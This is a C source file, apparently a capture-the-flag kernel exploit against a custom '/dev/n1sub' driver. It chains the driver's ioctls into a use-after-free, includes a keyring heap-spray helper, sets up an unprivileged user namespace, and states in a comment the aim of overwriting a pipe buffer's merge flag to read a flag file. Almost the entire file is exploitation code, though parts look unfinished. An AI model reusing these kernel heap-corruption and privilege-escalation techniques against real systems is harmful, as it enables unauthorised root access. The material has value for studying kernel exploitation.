#define _GNU_SOURCE
#include <bits/types/struct_itimerspec.h>
#include <bits/time.h>
#include <sys/timerfd.h>
#include <stddef.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <netinet/in.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <limits.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <linux/keyctl.h>
#include <sys/shm.h>
#include <ctype.h>

char * filepath = "/dev/n1sub\0";
int sfd;

#define PREFIX_BUF_LEN 16
#define RCU_HEAD_LEN 16

#define HEXDUMP_COLS 8

#define SUB_FREE 0xdeadbee1
#define SUB_SUB 0xdeadbee2
#define SUB_CREATE 0xdeadbee0
#define PIPE_BUF_TOTAL 0x10

//to make life easier
#define SYSCHK(x) ({          \
  typeof(x) __res = (x);      \
  if (__res == (typeof(x))-1) \
    err(1, "SYSCHK(" #x ")"); \
  __res;                      \
})

struct msg{
    long mtype;
    char mtext[1];
};

struct keyring_payload {
    uint8_t prefix[PREFIX_BUF_LEN];
    uint8_t rcu_buf[RCU_HEAD_LEN];
    unsigned short len;
};

typedef int32_t key_serial_t;

void err_log(char * string){
    printf("[X] %s\n", string); 
    exit(1);
}

void info_log(char * message){
    printf("[*] %s\n", message);
    return;
}

struct child_args {
    char **argv;        /* Command to be executed by child, with args */
    int    pipe_fd[2];  /* Pipe used to synchronize parent and child */
};

void hexdump(void *mem, unsigned int len)
{
    unsigned int i, j;
    for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
    {
        if(i % HEXDUMP_COLS == 0)
        {
            printf("0x%06x: ", i);
        }
        if(i < len)
        {
            printf("%02x ", 0xFF & ((char*)mem)[i]);
        }
        else /* end of block, just aligning for ASCII dump */
        {
            printf("   ");
        }
        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
        {
            for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
            {
                if(j >= len) /* end of block, not really printing */
                {
                    putchar(' ');
                }
                else if(isprint(((char*)mem)[j])) /* printable char */
                {
                    putchar(0xFF & ((char*)mem)[j]);        
                }
                else /* other char */
                {
                    putchar('.');
                }
            }
            putchar('\n');
        }
    }
}

/*
 * this mallocs a thing via kmalloc, and returns some offset
 * if NULL is send than the sub offset is not returned
 * if sub_offset is not null it will be returned, but no buffer is created
 * returns the size of the malloc
 * can call as many times as you want, but after 2 calls, it will continuously overwrite the 3rd malloced section
 */
uint64_t create_sub(uint32_t* sub_offset){
    return ioctl(sfd, SUB_CREATE, sub_offset);
}

/*
 * index has the constraint of being less than 3, this byte will be manipulated
 * subtracts in integers
 * so, it can manipulate pointers without the need to bypass aslr
 */
void sub_sub(uint64_t index){
    SYSCHK(ioctl(sfd, SUB_SUB, index));
    return;
}

void free_sub(uint64_t index){
    SYSCHK(ioctl(sfd, SUB_FREE, index));
    return;
}

static inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid) {
    return syscall(__NR_add_key, type, description, payload, plen, ringid);
}

static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5) {
    return syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);
}

void errout(char *msg)
{
    perror(msg);
    exit(-1);
}

/**
 * spray_keyring(): Spray the heap with `user_key_payload` structure
 * @spray_size: Number of object to put into the `kmalloc-64` cache
 *
 * Return: Allocated buffer with serial numbers of the created keys
 */
key_serial_t *spray_keyring(uint32_t spray_size, uint64_t size_desc) {

    char * key_desc = malloc(size_desc); // spray size = KEY_DESC_MAX_SIZE+0x18
                                       // *
    key_serial_t *id_buffer = calloc(spray_size, sizeof(key_serial_t));

    if (id_buffer == NULL)
        errout("calloc");

    for (uint32_t i = 0; i < spray_size; i++) {
        snprintf(key_desc, size_desc, "lanleft-%03du", i);
        id_buffer[i] = add_key("user", key_desc, key_desc, size_desc, KEY_SPEC_PROCESS_KEYRING);
        if (id_buffer[i] < 0)
            errout("add_key");
    }

    return id_buffer;
}

static int childFunc(void *arg){
    struct child_args *args = arg;
    char ch;

    printf("[!] hello from the child\n");

    read(args->pipe_fd[0], &ch, 1);


    system("cat flag");

    err(EXIT_FAILURE, "execvp");
}

static void update_map(char *mapping, char *map_file){
    int fd;
    size_t map_len;     /* Length of 'mapping' */

    /* Replace commas in mapping string with newlines. */

    map_len = strlen(mapping);
    for (size_t j = 0; j < map_len; j++)
        if (mapping[j] == ',')
            mapping[j] = '\n';

    fd = open(map_file, O_RDWR);
    if (fd == -1) {
        fprintf(stderr, "ERROR: open %s: %s\n", map_file,
                strerror(errno));
        exit(EXIT_FAILURE);
    }

    if (write(fd, mapping, map_len) != map_len) {
        fprintf(stderr, "ERROR: write %s: %s\n", map_file,
                strerror(errno));
        exit(EXIT_FAILURE);
    }

    close(fd);
}

static void proc_setgroups_write(pid_t child_pid, char *str){
    char setgroups_path[PATH_MAX];
    int fd;

    snprintf(setgroups_path, PATH_MAX, "/proc/%jd/setgroups",
            (intmax_t) child_pid);

    fd = open(setgroups_path, O_RDWR);
    if (fd == -1) {

        /* We may be on a system that doesn't support
           /proc/PID/setgroups. In that case, the file won't exist,
           and the system won't impose the restrictions that Linux 3.19
           added. That's fine: we don't need to do anything in order
           to permit 'gid_map' to be updated.

           However, if the error from open() was something other than
           the ENOENT error that is expected for that case,  let the
           user know. */

        if (errno != ENOENT)
            fprintf(stderr, "ERROR: open %s: %s\n", setgroups_path,
                    strerror(errno));
        return;
    }

    if (write(fd, str, strlen(str)) == -1)
        fprintf(stderr, "ERROR: write %s: %s\n", setgroups_path,
                strerror(errno));

    close(fd);
}

#define STACK_SIZE (1024 * 1024)
/*
 * goal is to get a UAF then use it to overwrite the can merge flag of a pipe buffer
 */
int main(void){
    uint32_t sub_offset;
    uint64_t size;
    int pipe_fds[2];
    char* payload_buf;
    info_log("starting exploit...");
    sfd = SYSCHK(open(filepath, O_RDWR));
    key_serial_t *id_buffer;
    struct child_args args;
    pid_t child_pid;
    static char child_stack[STACK_SIZE];    /* Space for child's stack */

    int flags, opt, map_zero;
    char *uid_map = "0 1000 1", *gid_map = "0 1000 1";
    const int MAP_BUF_SIZE = 100;
    char map_buf[MAP_BUF_SIZE];
    char map_path[PATH_MAX];


    info_log("creating first buffer and getting the size");
    size = create_sub(&sub_offset);
    printf("[+] size:\t0x%04lx\n[+] sub_off:\t0x%04x\n", size, sub_offset);
    payload_buf = malloc(0x1000);

    //if(size <= 0x200 || size > 0x400) err_log("size if wrong\n");
    memset(payload_buf, 'A', size);

    free_sub(0);
    //create new user namespace
    info_log("creating usernamespace\n");
    SYSCHK(pipe(args.pipe_fd));
    child_pid = SYSCHK(clone(childFunc, child_stack+STACK_SIZE, CLONE_NEWUSER | SIGCHLD, &args));
    
    printf("[+] namespace created with pid %d\n", child_pid);

    //ripped from man page
    if (uid_map != NULL || map_zero) {
        snprintf(map_path, PATH_MAX, "/proc/%jd/uid_map",
                (intmax_t) child_pid);
        if (map_zero) {
            snprintf(map_buf, MAP_BUF_SIZE, "0 %jd 1",
                    (intmax_t) getuid());
            uid_map = map_buf;
        }
        update_map(uid_map, map_path);
    }

    if (gid_map != NULL || map_zero) {
        proc_setgroups_write(child_pid, "deny");

        snprintf(map_path, PATH_MAX, "/proc/%jd/gid_map",
                (intmax_t) child_pid);
        if (map_zero) {
            snprintf(map_buf, MAP_BUF_SIZE, "0 %ld 1",
                    (intmax_t) getgid());
            gid_map = map_buf;
        }
        update_map(gid_map, map_path);
    }

    create_sub(NULL);

    write(args.pipe_fd[1], "A", 1);

    sub_sub(0);
    sub_sub(0);
    sub_sub(0);
    sub_sub(0);

    //create_sub(NULL);
    //create_sub(NULL);

    free_sub(1);

    return 0;
}
